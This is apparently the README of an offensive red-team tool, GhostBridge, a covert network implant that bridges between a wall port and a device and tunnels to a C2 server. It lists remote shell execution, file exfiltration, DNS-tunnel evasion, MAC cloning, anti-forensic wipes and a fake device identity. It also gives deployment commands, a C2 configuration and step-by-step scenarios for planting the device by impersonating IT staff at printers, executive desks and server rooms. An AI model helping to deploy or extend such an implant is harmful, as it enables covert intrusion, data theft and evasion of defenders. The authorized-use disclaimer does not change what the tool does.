<h1 align="center">👻 MoMo-GhostBridge</h1>
<h3 align="center">Transparent Network Implant for Red Team Persistence</h3>

<p align="center">
  <strong>Drop it. Forget it. Own the network.</strong><br>
  <sub>Invisible Bridge • Reverse VPN • DNS Tunneling • Long-term Persistence</sub>
</p>

<p align="center">
  <a href="https://github.com/M0M0Sec/Momo-GhostBridge/releases"><img src="https://img.shields.io/badge/Version-0.6.0-blue?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/Platform-NanoPi%20R2S%20|%20Orange%20Pi%20R1+-orange?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/Python-3.11+-3776ab?style=for-the-badge&logo=python&logoColor=white" alt="Python"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Tests-87%20Passing-success?style=flat-square" alt="Tests"></a>
  <a href="#"><img src="https://img.shields.io/badge/Coverage-82%25-brightgreen?style=flat-square" alt="Coverage"></a>
  <a href="#"><img src="https://img.shields.io/badge/Build-Passing-success?style=flat-square" alt="Build"></a>
  <a href="#"><img src="https://img.shields.io/badge/Code%20Style-Ruff-000000?style=flat-square" alt="Code Style"></a>
</p>

<p align="center">
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-features">Features</a> •
  <a href="#-architecture">Architecture</a> •
  <a href="#-hardware">Hardware</a> •
  <a href="#-ecosystem">Ecosystem</a> •
  <a href="#-documentation">Docs</a>
</p>

---

> ⚠️ **DEVELOPMENT STATUS**
> 
> This project is currently **under active development** and has **not been tested in a live/production environment** yet. Features are being implemented and may change. Use at your own risk and only in authorized test environments. Contributions and feedback are welcome!

---

## 📖 Table of Contents

- [What is GhostBridge?](#-what-is-ghostbridge)
- [Key Features](#-key-features)
- [Quick Start](#-quick-start)
- [Installation](#-installation)
- [Architecture](#-architecture)
- [Supported Hardware](#-supported-hardware)
- [Attack Scenarios](#-attack-scenarios)
- [Configuration](#-configuration)
- [CLI Reference](#-cli-reference)
- [MoMo Ecosystem](#-momo-ecosystem)
- [Documentation](#-documentation)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🎯 What is GhostBridge?

**GhostBridge** is a stealthy network implant designed for **Red Team operations**. It sits transparently between a network port and a target device (PC, printer, etc.), creating a persistent backdoor into the corporate network.

### The Concept

```
┌─────────────┐      ┌─────────────────┐      ┌─────────────────┐
│  Wall Port  │─────▶│   GhostBridge   │─────▶│  Target Device  │
│  (Network)  │      │  (Invisible L2) │      │  (PC/Printer)   │
└─────────────┘      └────────┬────────┘      └─────────────────┘
                              │
                              │ Encrypted Tunnel
                              ▼
                     ┌─────────────────┐
                     │   C2 Server     │
                     │  (Your VPS)     │
                     └─────────────────┘
```

### Why GhostBridge?

| Challenge | GhostBridge Solution |
|-----------|---------------------|
| 🔌 Physical access is brief | ✅ 30-second drop & go deployment |
| 🔍 Network scans detect implants | ✅ Layer 2 bridge - completely invisible |
| 🔐 VPNs get blocked by firewalls | ✅ DNS tunnel fallback (port 53) |
| 📍 New MAC triggers alerts | ✅ Clones target device MAC address |
| 🔋 Needs external power | ✅ Powers from target's USB port |
| 📦 Too large to conceal | ✅ Smaller than a cigarette pack |

---

## ✨ Key Features

<table>
<tr>
<td width="33%" valign="top">

### 🌉 Network Stealth
- Transparent L2 Bridge
- MAC Address Cloning
- No ARP Announcements
- No Listening Ports
- Traffic Timing Jitter

</td>
<td width="33%" valign="top">

### 🔐 Secure Tunneling
- WireGuard VPN (Primary)
- DNS Tunneling (Fallback)
- Auto-Reconnect
- Exponential Backoff
- Multi-path Failover

</td>
<td width="33%" valign="top">

### 🛡️ Anti-Forensics
- RAM-only Logging
- Secure Wipe on Panic
- Fake Device Identity
- Kill Switch
- Encrypted Storage

</td>
</tr>
</table>

### 🔥 Core Capabilities

<details>
<summary><b>Network Bridge</b> - Click to expand</summary>

| Feature | Description | Status |
|---------|-------------|:------:|
| **Transparent L2 Bridge** | Invisible to network scans, no IP address | ✅ |
| **MAC Cloning** | Automatically clones target device MAC | ✅ |
| **STP Disabled** | Fast convergence, stealth operation | ✅ |
| **Promiscuous Mode** | Full traffic visibility | ✅ |
| **Link Monitoring** | Auto-detect cable changes | ✅ |
| **802.1X Bypass** | Pass-through authentication | 🔜 |

</details>

<details>
<summary><b>Tunnel Management</b> - Click to expand</summary>

| Feature | Description | Status |
|---------|-------------|:------:|
| **WireGuard VPN** | Primary encrypted tunnel | ✅ |
| **DNS Tunneling** | Fallback when VPN blocked | ✅ |
| **Auto-Reconnect** | Persistent with exponential backoff | ✅ |
| **Health Monitoring** | Handshake age tracking | ✅ |
| **Multi-Server** | Failover between C2 endpoints | ✅ |
| **TCP/443 Mode** | WireGuard over HTTPS port | 🔜 |

</details>

<details>
<summary><b>DNS Tunneling (v0.6.0)</b> - Click to expand</summary>

| Feature | Description | Status |
|---------|-------------|:------:|
| **Base32/Hex Encoding** | DNS-safe data encoding | ✅ |
| **Zlib Compression** | Reduced query count | ✅ |
| **0x20 Randomization** | Case randomization for evasion | ✅ |
| **TXT/NULL Records** | Multiple record type support | ✅ |
| **Query Jitter** | Timing randomization | ✅ |
| **Rate Limiting** | Prevent detection by volume | ✅ |

**Fallback Chain:**

| Priority | Method | Port | Use Case |
|:--------:|--------|:----:|----------|
| 1 | WireGuard UDP | 51820 | Primary - fastest |
| 2 | WireGuard TCP | 443 | Firewalled networks |
| 3 | DNS Tunnel | 53 | VPN blocked |
| 4 | Auto-restore | - | Return to primary |

</details>

<details>
<summary><b>Stealth & Anti-Forensics</b> - Click to expand</summary>

| Feature | Description | Status |
|---------|-------------|:------:|
| **RAM Logging** | No persistent logs (tmpfs) | ✅ |
| **Log Suppression** | Automatic sensitive file cleanup | ✅ |
| **Secure Wipe** | Multi-pass overwrite on panic | ✅ |
| **Fake Identity** | Responds as "Netgear Switch" | ✅ |
| **Threat Detection** | Monitor for scanning tools | ✅ |
| **Kill Switch** | Remote self-destruct command | ✅ |
| **Encrypted Storage** | dm-crypt filesystem | 🔜 |

</details>

<details>
<summary><b>C2 Integration</b> - Click to expand</summary>

| Feature | Description | Status |
|---------|-------------|:------:|
| **Beacon Service** | Periodic heartbeat with jitter | ✅ |
| **Command Polling** | Receive commands from Nexus | ✅ |
| **Shell Execution** | Remote command execution | ✅ |
| **File Upload** | Exfiltrate data to C2 | ✅ |
| **Config Push** | Remote configuration updates | ✅ |
| **Health Reports** | System stats & diagnostics | ✅ |

</details>

---

## 🚀 Quick Start

### One-Line Install

```bash
# Clone and install
git clone https://github.com/M0M0Sec/Momo-GhostBridge.git
cd Momo-GhostBridge
pip install -e ".[dev]"

# Verify installation
ghostbridge --version
ghostbridge test
```

### Deploy to Device

```bash
# Generate configuration
ghostbridge config generate -o config.yml

# Edit with your C2 details
nano config.yml

# Deploy to NanoPi R2S
sudo ./scripts/deploy.sh "vpn.yourserver.com:51820" "SERVER_PUBKEY"

# Start service
ghostbridge run
```

### Verify Operation

```bash
ghostbridge status          # Check system status
ghostbridge health          # Run health check
ghostbridge tunnel status   # Check tunnel connection
```

---

## 📦 Installation

### Prerequisites

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| **Hardware** | Orange Pi R1+ LTS | NanoPi R2S Plus |
| **OS** | Armbian / DietPi | Armbian Bookworm |
| **Python** | 3.11 | 3.12+ |
| **Network** | 2x Ethernet | 2x Gigabit Ethernet |
| **Storage** | 8GB SD | 32GB eMMC |

### Method 1: Quick Install

```bash
# Clone repository
git clone https://github.com/M0M0Sec/Momo-GhostBridge.git
cd Momo-GhostBridge

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install with dependencies
pip install -e ".[dev]"

# Run tests
pytest tests/ -v
```

### Method 2: Production Deployment

```bash
# Install system dependencies
sudo apt install -y wireguard-tools bridge-utils

# Install GhostBridge
pip install ghostbridge

# Copy configuration
sudo mkdir -p /etc/ghostbridge
sudo cp config/config.example.yml /etc/ghostbridge/config.yml

# Install systemd service
sudo cp services/ghostbridge.service /etc/systemd/system/
sudo systemctl enable --now ghostbridge
```

### Method 3: Development Setup

```bash
# Clone with submodules
git clone --recursive https://github.com/M0M0Sec/Momo-GhostBridge.git
cd Momo-GhostBridge

# Install dev dependencies
pip install -e ".[dev]"

# Setup pre-commit hooks
pre-commit install

# Run full test suite
make test

# Run linting
make lint
```

---

## 🏗️ Architecture

### System Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           GHOSTBRIDGE CORE                               │
├─────────────────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐    │
│  │   Bridge    │  │   Tunnel    │  │   Beacon    │  │   Stealth   │    │
│  │   Engine    │  │   Manager   │  │   Service   │  │   Module    │    │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘    │
│         │                │                │                │            │
├─────────┴────────────────┴────────────────┴────────────────┴────────────┤
│                         INFRASTRUCTURE                                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │ Network  │  │WireGuard │  │   DNS    │  │  System  │  │    C2    │  │
│  │ Manager  │  │ Manager  │  │  Tunnel  │  │  (Wipe)  │  │  Client  │  │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
```

### Network Flow

```
                    CORPORATE NETWORK
                          │
           ┌──────────────┴──────────────┐
           │                             │
    ┌──────▼──────┐              ┌───────▼───────┐
    │   eth0      │              │     eth1      │
    │  (WAN)      │              │    (LAN)      │
    │ To Wall     │              │  To Target    │
    └──────┬──────┘              └───────┬───────┘
           │                             │
           └──────────┬──────────────────┘
                      │
               ┌──────▼──────┐
               │     br0     │    ◄── Transparent Bridge
               │  (Bridge)   │        No IP Address
               └─────────────┘
                      │
               ┌──────▼──────┐
               │     wg0     │    ◄── Encrypted Tunnel
               │ 10.66.66.x  │        To C2 Server
               └─────────────┘
```

### Directory Structure

```
ghostbridge/
├── src/ghostbridge/
│   ├── main.py                    # Main orchestrator
│   ├── cli.py                     # Command line interface (Click)
│   │
│   ├── core/                      # Core business logic
│   │   ├── config.py              # Pydantic configuration
│   │   ├── bridge.py              # L2 Bridge manager
│   │   ├── tunnel.py              # Tunnel orchestration
│   │   └── stealth.py             # Anti-forensics
│   │
│   ├── infrastructure/            # Hardware & network abstraction
│   │   ├── network/               # iproute2 wrapper, bridge ops
│   │   ├── wireguard/             # WireGuard management
│   │   ├── dns/                   # DNS tunneling (NEW v0.6.0)
│   │   │   ├── encoder.py         # Base32/Hex encoding
│   │   │   ├── client.py          # Async DNS client
│   │   │   └── tunnel.py          # DNS tunnel manager
│   │   └── system/                # RAM disk, secure wipe
│   │
│   └── c2/                        # C2 communication
│       ├── client.py              # MoMo API client
│       ├── beacon.py              # Heartbeat service
│       └── commands.py            # Command handlers
│
├── config/                        # Configuration templates
├── scripts/                       # Deployment scripts
├── services/                      # Systemd service files
├── tests/                         # Test suite (87 tests)
│   ├── test_bridge.py
│   ├── test_tunnel.py
│   ├── test_dns_tunnel.py
│   └── ...
└── docs/                          # Documentation
```

---

## 📡 Supported Hardware

### Recommended Devices

| Device | CPU | RAM | Network | Price | Rating |
|--------|-----|-----|---------|:-----:|:------:|
| **NanoPi R2S Plus** | RK3328 Quad A53 | 1GB DDR4 | 2x Gigabit | $45 | ⭐⭐⭐ |
| **Orange Pi R1+ LTS** | RK3328 Quad A53 | 1GB DDR4 | 2x Gigabit | $35 | ⭐⭐⭐ |
| **NanoPi R4S** | RK3399 Hexa-core | 4GB DDR4 | 2x Gigabit | $75 | ⭐⭐ |
| **PC Engines APU2** | AMD GX-412TC | 4GB DDR3 | 3x Gigabit | $180 | ⭐ |

### Bill of Materials (~$60-75)

| Item | Purpose | Cost |
|------|---------|-----:|
| Orange Pi R1+ LTS / NanoPi R2S | Main board | $35-45 |
| MicroSD Card 32GB (Class 10) | OS + Storage | $10 |
| Short Ethernet Cable (30cm) | LAN connection | $3 |
| USB-A to USB-C Cable | Power from target | $5 |
| 3D Printed Case (optional) | Concealment | $10 |

### Form Factor

```
    ┌────────────────────────────────┐
    │  ○ ○          ○ ○              │
    │ ┌──┐ ┌──┐   ┌──────┐  NanoPi   │
    │ │WA│ │LA│   │ USB-C│  R2S      │
    │ │N │ │N │   │      │           │
    │ └──┘ └──┘   └──────┘  55x52mm  │
    └────────────────────────────────┘
         ▲     ▲       ▲
         │     │       │
      To Wall  │    Power from
               │    Target USB
            To Target
```

---

## ⚔️ Attack Scenarios

### Scenario 1: Printer Drop

```
┌─────────────────────────────────────────────────────────────────┐
│  PHYSICAL ACCESS: ~30 seconds                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Enter office as "IT Support" or maintenance                  │
│  2. Find network printer in corner/hallway                       │
│  3. Unplug printer's ethernet from wall port                     │
│  4. Insert GhostBridge between wall and printer                  │
│  5. Power GhostBridge from printer's USB port                    │
│  6. Walk away - device auto-tunnels to your C2                   │
│                                                                  │
│  ┌─────────┐    ┌─────────────┐    ┌─────────┐                  │
│  │  Wall   │───▶│ GhostBridge │───▶│ Printer │                  │
│  │  Port   │    │   (hidden)  │    │         │                  │
│  └─────────┘    └──────┬──────┘    └────┬────┘                  │
│                        │                │                        │
│                        │    USB Power   │                        │
│                        └────────────────┘                        │
└─────────────────────────────────────────────────────────────────┘
```

### Scenario 2: Executive Desk

```
┌─────────────────────────────────────────────────────────────────┐
│  TARGET: C-Suite network segment                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Social engineer access to executive floor                    │
│  2. Locate target's desk (after hours preferred)                 │
│  3. Install between wall port and docking station                │
│  4. GhostBridge clones docking station's MAC                     │
│  5. Full access to executive VLAN                                │
│                                                                  │
│  RESULT: Persistent access to sensitive network segment          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Scenario 3: Server Room

```
┌─────────────────────────────────────────────────────────────────┐
│  TARGET: Management network / Out-of-band access                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Gain brief physical access to server room                    │
│  2. Find unused switch port or KVM connection                    │
│  3. Deploy GhostBridge on management VLAN                        │
│  4. Access iLO/iDRAC/IPMI interfaces                             │
│                                                                  │
│  RESULT: Complete infrastructure control                         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## ⚙️ Configuration

### Main Configuration File

```yaml
# /etc/ghostbridge/config.yml

# ═══════════════════════════════════════════════════════════════════
# Device Identity
# ═══════════════════════════════════════════════════════════════════
device:
  id: ghost-001                    # Unique device identifier
  name: "Office Printer Bridge"    # Human-readable name

# ═══════════════════════════════════════════════════════════════════
# Network Bridge
# ═══════════════════════════════════════════════════════════════════
network:
  bridge_name: br0
  wan_interface: eth0              # To wall port
  lan_interface: eth1              # To target device
  clone_mac: true                  # Clone target's MAC to WAN

# ═══════════════════════════════════════════════════════════════════
# Tunnel Configuration
# ═══════════════════════════════════════════════════════════════════
tunnel:
  type: wireguard
  interface: wg0
  endpoint: vpn.yourserver.com:51820
  keepalive: 25
  reconnect_delays: [5, 10, 30, 60, 300]

# ═══════════════════════════════════════════════════════════════════
# DNS Tunnel Fallback
# ═══════════════════════════════════════════════════════════════════
dns_tunnel:
  enabled: true
  domain: tunnel.yourserver.com
  nameservers: ["8.8.8.8", "1.1.1.1"]
  encoder: base32                  # base32, hex
  poll_interval: 30
  randomize_case: true             # 0x20 evasion

# ═══════════════════════════════════════════════════════════════════
# C2 Beacon
# ═══════════════════════════════════════════════════════════════════
beacon:
  enabled: true
  interval: 300                    # 5 minutes
  jitter: 60                       # ±60 seconds randomization

c2:
  api_endpoint: "http://10.66.66.1:8082/api/ghostbridge"
  timeout: 30
  verify_ssl: true

# ═══════════════════════════════════════════════════════════════════
# Stealth Settings
# ═══════════════════════════════════════════════════════════════════
stealth:
  ramfs_logs: true                 # No persistent logs
  fake_identity: "Netgear GS105"   # Identity if probed
  panic_on_tamper: true            # Auto-wipe on detection

# ═══════════════════════════════════════════════════════════════════
# Logging
# ═══════════════════════════════════════════════════════════════════
logging:
  level: WARNING                   # DEBUG, INFO, WARNING, ERROR
  to_disk: false                   # NEVER in production
  max_lines: 1000
```

---

## 🔧 CLI Reference

```bash
# ═══════════════════════════════════════════════════════════════════
# General Commands
# ═══════════════════════════════════════════════════════════════════
ghostbridge version                # Show version info
ghostbridge status                 # Show system status
ghostbridge health                 # Run health check
ghostbridge test                   # Run self-tests

# ═══════════════════════════════════════════════════════════════════
# Running GhostBridge
# ═══════════════════════════════════════════════════════════════════
ghostbridge run                    # Start full system
ghostbridge run -c /path/to/config # Custom config
ghostbridge start                  # Start bridge only
ghostbridge start --mode monitor   # Bridge + monitoring

# ═══════════════════════════════════════════════════════════════════
# Tunnel Management
# ═══════════════════════════════════════════════════════════════════
ghostbridge tunnel connect         # Connect VPN tunnel
ghostbridge tunnel disconnect      # Disconnect tunnel
ghostbridge tunnel reconnect       # Force reconnection
ghostbridge tunnel status          # Show tunnel status

# ═══════════════════════════════════════════════════════════════════
# Stealth Operations
# ═══════════════════════════════════════════════════════════════════
ghostbridge stealth wipe           # Wipe all logs
ghostbridge stealth check          # Check for threats
ghostbridge stealth status         # Show stealth status
ghostbridge stealth panic          # EMERGENCY WIPE (irreversible!)

# ═══════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════
ghostbridge config show            # Display current config
ghostbridge config generate -o f   # Generate template
ghostbridge config validate        # Validate config file
```

---

## 🌐 MoMo Ecosystem

GhostBridge is part of an integrated offensive security ecosystem:

```
                              ☁️ CLOUD LAYER
                    ┌─────────────────────────────────┐
                    │  GPU Cracking  │  Evilginx VPS  │
                    └────────────────┬────────────────┘
                                     │
                              ┌──────▼──────┐
                              │             │
                              │ 🟢 NEXUS    │
                              │ Central Hub │
                              │   v1.1.0    │
                              └──────┬──────┘
                                     │
     ┌───────────────┬───────────────┼───────────────┬───────────────┐
     │               │               │               │               │
┌────▼────┐   ┌──────▼──────┐ ┌──────▼──────┐ ┌──────▼──────┐ ┌──────▼──────┐
│         │   │             │ │             │ │             │ │             │
│🔵 MOMO  │   │👻GHOSTBRIDGE│ │  🎭 MIMIC   │ │ 👤 SHADOW   │ │   Future    │
│WiFi/BLE │   │   Network   │ │  USB Attack │ │ WiFi Recon  │ │  Projects   │
│  Pi 5   │   │   Implant   │ │  Pi Zero    │ │  Pi Zero    │ │     ...     │
│ v1.7.0  │   │   v0.6.0    │ │   v1.0.0    │ │   v0.1.0    │ │             │
└─────────┘   └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘
```

### Ecosystem Components

| Project | Description | Platform | Version | Status |
|---------|-------------|----------|:-------:|:------:|
| [**🔵 MoMo**](https://github.com/M0M0Sec/MoMo) | WiFi/BLE/SDR Audit Platform | Raspberry Pi 5 | v1.7.0 | ✅ |
| [**🟢 Nexus**](https://github.com/M0M0Sec/MoMo-Nexus) | Central C2 Hub & Dashboard | Raspberry Pi 4 | v1.1.0 | ✅ |
| [**👻 GhostBridge**](https://github.com/M0M0Sec/Momo-GhostBridge) | Transparent Network Implant | NanoPi R2S | v0.6.0 | ✅ |
| [**🎭 Mimic**](https://github.com/M0M0Sec/MoMo-Mimic) | USB Attack Platform | Pi Zero 2W | v1.0.0 | ✅ |
| [**👤 Shadow**](https://github.com/M0M0Sec/MoMo-Shadow) | Stealth WiFi Recon Device | Pi Zero 2W | v0.1.0 | 🔜 |

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [📖 ARCHITECTURE.md](docs/ARCHITECTURE.md) | Technical architecture & design |
| [🚀 DEPLOYMENT.md](docs/DEPLOYMENT.md) | Deployment & installation guide |
| [🔐 OPERATIONS.md](docs/OPERATIONS.md) | Operational security & OPSEC |
| [🗺️ ROADMAP.md](docs/ROADMAP.md) | Development roadmap |

---

## 📊 Project Status

| Version | Feature | Status |
|---------|---------|:------:|
| v0.1.0 | Core Infrastructure | ✅ |
| v0.2.0 | Bridge Engine | ✅ |
| v0.3.0 | WireGuard Tunnel | ✅ |
| v0.4.0 | Beacon Service | ✅ |
| v0.5.0 | Stealth Module | ✅ |
| **v0.6.0** | **DNS Tunneling** | ✅ **NEW** |
| v0.7.0 | Encrypted Storage | 🔜 |
| v0.8.0 | 802.1X Bypass | 🔜 |
| v1.0.0 | Production Ready | 🔜 |

**Statistics:**
- 📝 **87 Tests** passing
- 📊 **82% Coverage**
- 🔌 **4 Core Modules**
- 🛡️ **3 Tunnel Types**

---

## 🤝 Contributing

Contributions are welcome! Please read our contributing guidelines.

### Development Workflow

```bash
# Setup
git clone https://github.com/M0M0Sec/Momo-GhostBridge.git
cd Momo-GhostBridge
pip install -e ".[dev]"

# Test
pytest tests/ -v --cov=ghostbridge

# Lint
ruff check src/
mypy src/

# Format
black src/
```

### Commit Convention

```
type(scope): description

Types: feat, fix, docs, style, refactor, test, chore
```

---

## ⚠️ Legal Disclaimer

> **GhostBridge is designed for authorized Red Team operations and security research only.**

- ✅ Only deploy on networks you own or have explicit written authorization to test
- ✅ Unauthorized deployment is illegal in most jurisdictions
- ✅ Always obtain proper authorization before any engagement
- ❌ The developers are not responsible for misuse of this tool
- ❌ Unauthorized network access is a criminal offense

---

## 📜 License

This project is part of the MoMo ecosystem and is licensed under the **MIT License**.

---

<p align="center">
  <strong>Part of the 🔥 MoMo Ecosystem</strong><br>
  <sub>Offensive Security Toolkit for Red Teams</sub>
</p>

<p align="center">
  <a href="https://github.com/M0M0Sec/MoMo">🔵 MoMo</a> •
  <a href="https://github.com/M0M0Sec/MoMo-Nexus">🟢 Nexus</a> •
  <a href="https://github.com/M0M0Sec/Momo-GhostBridge">👻 GhostBridge</a> •
  <a href="https://github.com/M0M0Sec/MoMo-Mimic">🎭 Mimic</a> •
  <a href="https://github.com/M0M0Sec/MoMo-Shadow">👤 Shadow</a>
</p>

<p align="center">
  <sub>Made with ❤️ by the MoMo Team</sub>
</p>
